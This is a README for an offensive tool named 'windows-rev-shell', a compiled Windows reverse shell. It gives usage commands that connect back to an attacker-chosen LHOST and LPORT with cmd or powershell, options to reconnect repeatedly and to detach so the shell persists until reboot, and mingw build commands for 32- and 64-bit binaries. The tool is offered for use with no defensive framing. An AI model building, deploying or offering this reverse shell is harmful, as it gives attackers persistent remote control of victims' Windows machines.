# windows-rev-shell
An advanced windows reverse shell. Allows to specify the type of shell (cmd or powershell), can be programmed to automatically attempt to reconnect and can be spawned as a detatched process to avoid blocking the terminal.
## Usage
Send the reverse shell only once. The program will wait until the connection is enstablished and will be terminated when the connection is closed.
```
shell.exe LHOST LPORT <cmd|powershell> 0
``` 
Attempt to reconnect to the specified IP. The last parameter indicates the number of seconds between attempts.
```
shell.exe LHOST LPORT <cmd|powershell> ATTEMPT_DELAY
```
The reverse shell is spawned as subprocess to keep the current terminal free. The process is disposed once the connection is closed.
```
shell.exe LHOST LPORT <cmd|powershell> 0 s
```
Spawn a reverse shell subprocess that will periodically attempt to reconnect to the host. The process is indipendent from the original shell and will continue to exist until the machine is rebooted.
```
shell.exe LHOST LPORT <cmd|powershell> ATTEMPT_DELAY s
```
## Building
32 Bit version
```
i686-w64-mingw32-gcc windows.c -o shell.exe -lws2_32
```
64 Bit version
```
x86_64-w64-mingw32-gcc windows.c -o shell.exe -lws2_32
```
